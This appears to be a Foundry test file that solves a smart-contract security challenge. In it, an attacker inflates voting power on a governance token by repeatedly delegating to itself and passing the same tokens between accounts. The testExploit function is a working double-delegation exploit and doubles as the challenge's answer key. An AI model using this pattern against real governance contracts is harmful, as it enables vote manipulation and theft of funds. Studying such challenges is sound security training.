// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Utilities} from "../Utilities.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {NotSushiToken} from "../../src/governance-shenanigans/NotShushiToken.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

contract GovernanceShenanigansTest is Test {
  Utilities private utils;

  address payable private attacker;
  address payable private voter1;
  address payable private voter2;
  address payable private voter3;

  NotSushiToken private govToken;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(4);
    attacker = users[0];
    voter1 = users[1];
    voter2 = users[2];
    voter3 = users[3];
    vm.label(attacker, "Attacker");
    vm.label(voter1, "Voter1");
    vm.label(voter2, "Voter2");
    vm.label(voter3, "Voter3");

    govToken = new NotSushiToken();

    address[] memory voters = new address[](4);
    voters[0] = attacker;
    voters[1] = voter1;
    voters[2] = voter2;
    voters[3] = voter3;

    govToken.addWledAddresses(voters);
    govToken.mint(voter1, 2_000e18);
    govToken.mint(attacker, 500e18);

    vm.prank(voter1);
    govToken.delegate(voter1);
  }

  function testExploit() public {
    // Exploit start

    vm.startPrank(attacker);
    govToken.delegate(attacker);
    govToken.transfer(voter2, 500e18);
    vm.stopPrank();

    vm.startPrank(voter2);
    govToken.delegate(attacker);
    govToken.transfer(voter3, 500e18);
    vm.stopPrank();

    vm.startPrank(voter3);
    govToken.delegate(attacker);
    vm.stopPrank();

    // Exploit end

    validate();
  }

  function validate() private {
    assertGt(
      govToken.getCurrentVotes(attacker),
      govToken.getCurrentVotes(voter1)
    );
  }
}
